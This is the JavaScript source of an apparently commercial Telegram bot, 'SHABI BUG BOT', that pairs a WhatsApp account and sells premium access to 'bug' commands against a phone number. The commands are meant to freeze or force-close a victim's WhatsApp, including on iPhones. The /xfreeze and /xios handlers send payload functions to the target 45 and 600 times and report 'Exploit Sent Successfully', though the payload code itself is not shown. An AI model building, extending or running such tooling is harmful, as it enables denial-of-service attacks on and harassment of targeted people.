const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

//const databaseUrl = 'https://raw.githubusercontent.com/abilhrdiana23-design/roxster/refs/heads/main/token.json';
const thumbnailUrl = "https://files.catbox.moe/ot1z61.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let authState = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
              ⢀     ⢀  ⣰⡇⢀⡄   
              ⢸⡄ ⣿⣰⡀⢠⣿⣇⣾⡇   
              ⢸⣿⣰⣿⣿⢇⣾⣿⣼⣿⢃⡞  
              ⠘⣿⣿⣿⢋⣾⣿⣿⣿⣯⣿⠇  
               ⣿⢟⣵⣿⣿⣿⣿⣿⣿⣯⡞  
              ⢀⣵⣿⣿⣿⣿⣿⣿⣿⣿⡿⡁  
           ⣠⣦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃  
          ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁  
          ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡡   
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁   
         ⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁    
  ⢀⣀⣄⣀⡀⡀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡥      
 ⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋       
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁       
⠘⣿⠋⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋          
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣀⡀    
    ⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠃  
      ⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
     ⢰⣾⣿⣿⣿⣿⣿⠟⠁⠉⠙⠻⠯⡛⠿⠛⠻⠿⠟⠛⠓  
 ⠜⡿⠳⡶⠻⣿⣿⣿⣿⠛⠁                
  ⣠⣽⣧⣾⠛⠉⠋                   
  ⠉⠟⠁⠘⠃
© KING SHABI INC
╰➤ INFORMATION:
 ⬡ Developer: @Brand_Shabi_00
 ⬡ Version: 2.0 Beta
 ⬡ Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    authState = state;
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Netrality',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Unknown";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote>
© KING SHABI INC
⬡ Number: ${lastPairingMessage.phoneNumber}
⬡ Pairing Code: ${lastPairingMessage.pairingCode}
⬡ Type: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀              ⢀     ⢀  ⣰⡇⢀⡄   
              ⢸⡄ ⣿⣰⡀⢠⣿⣇⣾⡇   
              ⢸⣿⣰⣿⣿⢇⣾⣿⣼⣿⢃⡞  
              ⠘⣿⣿⣿⢋⣾⣿⣿⣿⣯⣿⠇  
               ⣿⢟⣵⣿⣿⣿⣿⣿⣿⣯⡞  
              ⢀⣵⣿⣿⣿⣿⣿⣿⣿⣿⡿⡁  
           ⣠⣦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃  
          ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁  
          ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡡   
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁   
         ⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁    
  ⢀⣀⣄⣀⡀⡀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡥      
 ⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋       
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁       
⠘⣿⠋⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋          
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣀⡀    
    ⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠃  
      ⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
     ⢰⣾⣿⣿⣿⣿⣿⠟⠁⠉⠙⠻⠯⡛⠿⠛⠻⠿⠟⠛⠓  
 ⠜⡿⠳⡶⠻⣿⣿⣿⣿⠛⠁                
  ⣠⣽⣧⣾⠛⠉⠋                   
  ⠉⠟⠁⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

© KING SHABI INC

╰➤ INFORMATION:
 ⬡ Developer: @Brand_Shabi_00
 ⬡ Version: 2.0 Beta
 ⬡ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Trying to Link Device' : 'Please Link the Device Again'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ No sender is connected");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Please wait ${remaining} seconds`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Premium access only");
        return;
    }
    next();
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Owner access only");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Invalid number");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket is not ready, please try again later");
    if (authState?.creds?.registered) {
      return ctx.reply(`✅ ☇ WhatsApp is already connected with number: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `<blockquote>
© KING SHABI INC
⬡ Number: ${phoneNumber}
⬡ Pairing Code: ${formattedCode}
⬡ Type: Not Connected
</blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote>
© KING SHABI INC
⬡ Number: ${lastPairingMessage.phoneNumber}
⬡ Pairing Code: ${lastPairingMessage.pairingCode}
⬡ Type: Connected
</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Owner access only");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown successfully set to ${seconds} seconds`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Owner access only");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session successfully deleted, panel will restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ No session folder found");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Failed to delete session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Owner access only");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Duration must be a number of days");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} successfully added as a premium user until ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Owner access only");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} successfully removed from the premium user list`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Owner access only");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Duration must be a number of days");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} successfully added as a premium group until ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Owner access only");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} successfully removed from the premium user list`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} is not in the premium list`);
    }
});

bot.use((ctx, next) => {
  if (secureMode) {
    return;
  }
  return next();
});

bot.start(ctx => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote>「 𝐒𝐇𝐀𝐁𝐈 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦📟」
 This script can be dangerous to users and targets, so use it wisely. 
𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 - 𝐒𝐂𝐑𝐈𝐏𝐓
⬡ Memory : 128GB
⬡ Type: ( Plugin )
⬡ Dev : @Brand_Shabi_00 
⬡ InterFace: Button Type
Support
Contact @Brand_Shabi_00 for assistance</blockquote>`;


    const keyboard = [
        [
            {
                text: "𝗢𝗪𝗡𝗘𝗥 𝗔𝗖𝗖𝗘𝗦𝗦",
                callback_data: "controls", style: "primary"
            },
            {
                text: "𝗕𝗨𝗚 𝗦𝗣𝗔𝗠",
                callback_data: "bug", style: "primary"
            }
        ],
        [
            {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "tqto", style: "success"
            },
        ],
        [
            {
                text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥",
                url: "https://t.me/Brand_Shabi_00", style: "primary"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/KingshabiBio", style: "primary"
            }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('start', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote>「 𝐒𝐇𝐀𝐁𝐈 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦📟」
 This script can be dangerous to users and targets, so use it wisely. 
𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 - 𝐒𝐂𝐑𝐈𝐏𝐓
 ⬡ Memory : 128GB
 ⬡ Type: ( Plugin )
 ⬡ Dev : @Brand_Shabi_00 
 ⬡ InterFace: Button Type
Support
Contact @Brand_Shabi_00 for assistance</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗢𝗪𝗡𝗘𝗥 𝗔𝗖𝗖𝗘𝗦𝗦",
                callback_data: "controls", style: "primary"
            },
            {
                text: "𝗔𝗧𝗧𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "bug", style: "primary"
            }
        ],
        [
            {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "tqto", style: "success"
            },
        ],
        [
            {
                text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥",
                url: "https://t.me/Brand_Shabi_00", style: "primary"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/KingshabiBio", style: "primary"
            }
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Telegram button handler error:", error);
        }
    }
});

bot.action('controls', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const controlsMenu = `<blockquote>「𝐒𝐇𝐀𝐁𝐈 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦📟」
 This script can be dangerous to users and targets, so use it wisely. 
𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 - 𝐒𝐂𝐑𝐈𝐏𝐓
 ⬡ Memory : 128GB
 ⬡ Type: ( Plugin )
 ⬡ Dev : @Brand_Shabi_00 
 ⬡ InterFace: Button Type
Support
Contact @Brand_Shabi_00 for assistance
──────────────────────────
 ⌜ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗠𝗘𝗡𝗨 ⌟
┊✦ /requestpair - Add Sender Number
┊✦ /setcooldown - Set Bot Cooldown
┊✦ /resetsession - Reset Existing Session
┊✦ /addpremium - Add Premium Users
┊✦ /delpremium - Delete Premium Users
┊✦ /addgcpremium - Add Premium Group
┊✦ /delgcpremium - Delete Premium Group
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "start", style: "primary"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Telegram button handler error:", error);
        }
    }
});

bot.action('bug', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const bugMenu = `<blockquote>「 𝐒𝐇𝐀𝐁𝐈 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦📟」
 This script can be dangerous to users and targets, so use it wisely. 
𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 - 𝐒𝐂𝐑𝐈𝐏𝐓
 ⬡ Memory : 128GB
 ⬡ Type: ( Plugin )
 ⬡ Dev : @Brand_Shabi_00 
 ⬡ InterFace: Button Type
Support
Contact @Brand_Shabi_00 for assistance
──────────────────────────
⌜ 𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 𝗦𝗛𝗔𝗕𝗜 𝗦𝗣𝗔𝗠 ⌟
┊✦ /xfreeze - SHABI To Freeze
┊✦ /xios - SHABI To Forclose Iphone
┊✦ /androdelay - SHABI To Spam-Free Delay
┊✦ /androdela - SHABI To Delay Invisible
┊✦ /delayde - SHABI To Delay Hard
┊✦ /androdelaynew - SHABI To Delay Hard
┊✦ /forclose - SHABI To forclose no click
┊✦ /xcombo - SHABI To blank no click
┊✦ /testfunction - Use Your Own Function
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "start", style: "primary"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Telegram button handler error:", error);
        }
    }
});

bot.action('tqto', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const menuMessage = `<blockquote>「𝐒𝐇𝐀𝐁𝐈 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦📟」
 This script can be dangerous to users and targets, so use it wisely. 
𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 - 𝐒𝐂𝐑𝐈𝐏𝐓
 ⬡ Memory : 128GB
 ⬡ Type: ( Plugin )
 ⬡ Dev : @Brand_Shabi_00 
 ⬡ InterFace: Button Type
Support
Contact @Brand_Shabi_00 for assistance</blockquote>
<blockquote>──────────────────────────
 ⌜ 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 ⌟
┊ ⓘ 𝑶𝑾𝑵𝑬𝑹 𝑲𝑰𝑵𝑮 𝑺𝑯𝑨𝑩𝑰
┊ ⓘ 𝐘𝐨𝐮𝐫 𝐧𝐚𝐦𝐞 𝐬𝐜𝐫𝐢𝐩𝐭 𝐚𝐥𝐬𝐨 
┊ ⓘ 𝐩𝐚𝐢𝐝 𝐝𝐞𝐚𝐥 @Brand_Shabi_00
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "start", style: "primary"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(menuMessage, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Telegram button handler error:", error);
        }
    }
});

//CASE BUG DISINI \\
bot.command("xfreeze", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xfreeze 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Sending Exploit...
 ⬡ Target: ${q}
 ⬡ Status: Process
 ⬡ Type: xfreeze
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 45; i++) {
    await Rena4YouBlank(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Exploit Sent Successfully...
 ⬡ Target: ${q}
 ⬡ Status: Success
 ⬡ Type: xfreeze
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("xios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xios 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Sending Exploit...
 ⬡ Target: ${q}
 ⬡ Status: Process
 ⬡ Type: xios
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 600; i++) {
    await Faiqanjay(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Exploit Sent Successfully...
 ⬡ Target: ${q}
 ⬡ Status: Success
 ⬡ Type: xios
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});


